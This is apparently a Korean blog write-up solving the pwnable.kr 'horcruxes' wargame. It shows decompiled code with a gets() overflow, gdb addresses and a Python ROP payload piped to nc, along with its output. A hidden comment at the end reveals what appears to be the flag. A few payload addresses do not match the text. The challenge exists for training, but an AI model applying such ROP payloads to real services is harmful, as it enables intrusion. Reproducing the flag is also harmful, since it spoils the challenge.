---
title: "pwnable.kr - Toddler's bottle #19 horcruxes"
date: 2020-03-10
categories:
  - Information Security
tags:
  - pwnable.kr
---

[pwnable.kr][pwnable.kr] Toddler's bottle의 #19 horcruxes 문제 풀이

일단 main을 disas해보면 unlink에서 봤던 것과 유사한 부분이 나온다. 뭐 결론적으로는 별 의미 없었지만...  

~~~
   0x080a0001 <+221>:   mov    -0x4(%ebp),%ecx
   0x080a0004 <+224>:   leave
   0x080a0005 <+225>:   lea    -0x4(%ecx),%esp
   0x080a0008 <+228>:   ret
~~~

이번 문제는 소스코드가 주어지지 않았다.  
그래서 Ghidra를 이용해 decompile 해보았다. 대략 중요한 부분들은 다음과 같다

```c
void main(void)

{
  undefined4 uVar1;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  alarm(0x3c);
  hint();
  init_ABCDEFG();
  uVar1 = seccomp_init(0);
  seccomp_rule_add(uVar1,0x7fff0000,0xad,0);
  seccomp_rule_add(uVar1,0x7fff0000,5,0);
  seccomp_rule_add(uVar1,0x7fff0000,3,0);
  seccomp_rule_add(uVar1,0x7fff0000,4,0);
  seccomp_rule_add(uVar1,0x7fff0000,0xfc,0);
  seccomp_load(uVar1);
  ropme();
  return;
}

void init_ABCDEFG(void)

{
  ssize_t sVar1;
  int iVar2;
  uint local_14;
  int local_10;
  
  local_10 = open("/dev/urandom",0);
  sVar1 = read(local_10,&local_14,4);
  if (sVar1 != 4) {
    puts("/dev/urandom error");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  close(local_10);
  srand(local_14);
  iVar2 = rand();
  a = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  b = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  c = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  d = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  e = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  f = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  g = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  sum = g + a + b + c + d + e + f;
  return;
}


void A(void)

{
  printf("You found \"Tom Riddle\'s Diary\" (EXP +%d)\n",a);
  return;
}


void B(void)

{
  printf("You found \"Marvolo Gaunt\'s Ring\" (EXP +%d)\n",b);
  return;
}



undefined4 ropme(void)
{
  int iVar1;
  ssize_t sVar2;
  char local_78 [100];
  int local_14;
  int local_10;
  
  printf("Select Menu:");
  __isoc99_scanf(&DAT_080a0519,&local_14);
  getchar();
  if (local_14 == a) {
    A();
  }
  else {
    if (local_14 == b) {
      B();
    }
    else {
      if (local_14 == c) {
        C();
      }
      else {
        if (local_14 == d) {
          D();
        }
        else {
          if (local_14 == e) {
            E();
          }
          else {
            if (local_14 == f) {
              F();
            }
            else {
              if (local_14 == g) {
                G();
              }
              else {
                printf("How many EXP did you earned? : ");
                gets(local_78);
                iVar1 = atoi(local_78);
                if (iVar1 == sum) {
                  local_10 = open("flag",0);
                  sVar2 = read(local_10,local_78,100);
                  local_78[sVar2] = '\0';
                  puts(local_78);
                  close(local_10);
                    /* WARNING: Subroutine does not return */
                  exit(0);
                }
                puts("You\'d better get more experience to kill Voldemort");
              }
            }
          }
        }
      }
    }
  }
  return 0;
}
```

보면 asm에서 봤던 seccomp_rule_add 하는 부분이 여기에도 있는데 open, read, write, exit, exit_group외의 시스템 콜을 막는것 같다. 아마 쉘코드를 올려서 쉘을 따는 방법을 막으려고 이렇게 한 것 같다.  

ropme 를 보면 gets하는 부분이 있다. 다시 말해 buffer overflow를 할 수 있는 것이다  

함수 이름이 ropme인데 Return Oriented Programming을 사용하라는 뜻인것 같다.

Return oriented programming이란 스택에 대한 제어권을 가졌을때 리턴할 주소를 연속적으로 배치해서 특정 주소 리턴 -> 코드 실행 -> ret -> 특정 주소 리턴 -> 코드 실행을 반복하여 원하는 행동을 하는 테크닉이다.  

이 문제에서 해야 할 일은 A,B,C,D,E,F,G를 모두 호출해 랜덤하게 정해지는 EXP 값을 얻은 후 그것의 합을 알아내서 입력하는 것이다.  

A,B,C,D,E,F,G는 전부 인자도 안받고 그냥 출력한번 하고 끝이기 때문에 A,B,C,D,E,F,G의 주소를 연속으로 적어놓으면 리턴을 반복하면서 이들을 실행 시킬 수 있다.  

gdb에서 찍어본 이들의 주소는 이렇다  

~~~
(gdb) print A
$1 = {<text variable, no debug info>} 0x809fe4b <A>
(gdb) print B
$2 = {<text variable, no debug info>} 0x809fe6a <B>
(gdb) print C
$3 = {<text variable, no debug info>} 0x809fe89 <C>
(gdb) print D
$4 = {<text variable, no debug info>} 0x809fea8 <D>
(gdb) print E
$5 = {<text variable, no debug info>} 0x809fec7 <E>
(gdb) print F
$6 = {<text variable, no debug info>} 0x809fee6 <F>
(gdb) print G
$9 = {<text variable, no debug info>} 0x809ff05 <G>
(gdb) print ropme
$7 = {<text variable, no debug info>} 0x80a0009 <ropme>
~~~

마지막에 sum을 입력하려면 ropme를 다시한번 호출해야 하는데 주소가 0x80a0009라 중간에 NULL byte가 들어간다  
gets로 BOF를 하는 이상 NULL byte가 들어가선 안되므로 ropme를 직접 호출 하는 대신 다른 방법을 강구해야 한다.
그래서 main을 보니 call ropme 하는 부분의 주소가 0x809fffc이다.  
여기에는 NULL byte가 안들어가므로 이곳으로 jmp하면 문제를 해결할 수 있다  

여기까지 알아낸 것을 답으로 엮으면 다음과 같다  

~~~
horcruxes@pwnable:~$ (python -c "print '1\n'+'aaaa'*30+'\x4b\xfe\x09\x08'+'\x6a\xfe\x09\x08'+'\x89\xfe\x09\x08'+'\xa9\xfe\x09\x08'+'\xa8\xfe\x09\x08'+'\xc7\xfe\x09\x08'+'\xe6\xfe\x09\x08'+'\x05\xff\x09\x08'+'\xf9\xff\x09\x08'";cat) | nc 0 9032
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and destroy it!

Select Menu:How many EXP did you earned? : You'd better get more experience to kill Voldemort
You found "Tom Riddle's Diary" (EXP +357247400)
You found "Marvolo Gaunt's Ring" (EXP +90367344)
You found "Helga Hufflepuff's Cup" (EXP +72064967)
You found "Salazar Slytherin's Locket" (EXP +1589617855)
You found "Rowena Ravenclaw's Diadem" (EXP +1345747963)
You found "Nagini the Snake" (EXP +771734896)
You found "Harry Potter" (EXP +2121332346)
Select Menu:1
How many EXP did you earned? : 2053145475
<tag output>
~~~

[pwnable.kr]: https://pwnable.kr

<!-- Magic_spell_1s_4vad4_K3daVr4! -->